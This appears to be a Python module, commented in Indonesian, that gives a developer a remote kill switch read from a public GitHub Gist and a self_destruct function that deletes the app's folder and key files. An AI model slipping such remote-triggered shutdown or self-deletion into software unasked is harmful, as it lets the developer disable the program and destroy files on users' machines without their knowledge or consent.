"""
Remote Kill Switch - kontrol akses via GitHub Gist.

Developer membuat GitHub Gist dengan isi JSON:
{
    "active": true,
    "message": "",
    "shutdown_at": null
}

Ketika developer ingin mematikan app:
- Set "active": false → app langsung mati
- Atau set "shutdown_at": "2026-08-22T18:00:00" → app mati di waktu itu

Cara pakai:
1. Buat GitHub Gist baru
2. Isi dengan JSON di atas
3. Copy Gist ID (bagian dari URL: https://gist.github.com/user/GIST_ID)
4. Set Gist ID di config.py
5. Set Gist sebagai public agar bisa diakses tanpa auth
"""

import json
import os
import sys
import shutil
import urllib.request
import urllib.error
from datetime import datetime
from pathlib import Path


def get_kill_switch_config():
    """Ambil konfigurasi kill switch dari GitHub Gist."""
    try:
        from config import KILL_SWITCH_GIST_ID, KILL_SWITCH_ENABLED

        if not KILL_SWITCH_ENABLED:
            return {"active": True, "message": "Kill switch disabled", "shutdown_at": None}

        if not KILL_SWITCH_GIST_ID:
            return {"active": True, "message": "No Gist ID configured", "shutdown_at": None}

        url = f"https://gist.githubusercontent.com/raw/{KILL_SWITCH_GIST_ID}"
        req = urllib.request.Request(url, headers={"User-Agent": "RekapSKU/1.0"})
        with urllib.request.urlopen(req, timeout=10) as response:
            data = json.loads(response.read().decode("utf-8"))
            return data

    except urllib.error.URLError:
        # Jika tidak ada internet, allow app jalan (offline mode)
        return {"active": True, "message": "Offline mode - kill switch not checked", "shutdown_at": None}
    except json.JSONDecodeError:
        return {"active": True, "message": "Invalid JSON in kill switch config", "shutdown_at": None}
    except Exception as e:
        return {"active": True, "message": f"Error checking kill switch: {e}", "shutdown_at": None}


def check_kill_switch():
    """
    Cek apakah app masih boleh jalan.
    Return (can_run: bool, message: str)
    """
    config = get_kill_switch_config()

    # Cek apakah active
    if not config.get("active", True):
        return False, config.get("message", "Aplikasi telah dinonaktifkan oleh developer.")

    # Cek shutdown_at
    shutdown_at = config.get("shutdown_at")
    if shutdown_at:
        try:
            shutdown_time = datetime.fromisoformat(shutdown_at)
            if datetime.now() >= shutdown_time:
                return False, config.get("message", f"Aplikasi dimatikan pada {shutdown_at}")
        except ValueError:
            pass

    return True, config.get("message", "OK")


def self_destruct():
    """
    Hapus file aplikasi secara lokal (self-destruct).
    Hanya hapus folder app/ dan file terkait, tidak hapus folder utama.
    """
    app_dir = Path(__file__).parent
    project_dir = app_dir.parent

    # File yang akan dihapus
    files_to_delete = [
        project_dir / "app",
        project_dir / "config.py",
        project_dir / "requirements.txt",
        project_dir / "run.py",
    ]

    deleted = []
    for f in files_to_delete:
        try:
            if f.is_dir():
                shutil.rmtree(f)
            elif f.is_file():
                f.unlink()
            deleted.append(str(f))
        except Exception:
            pass

    return deleted
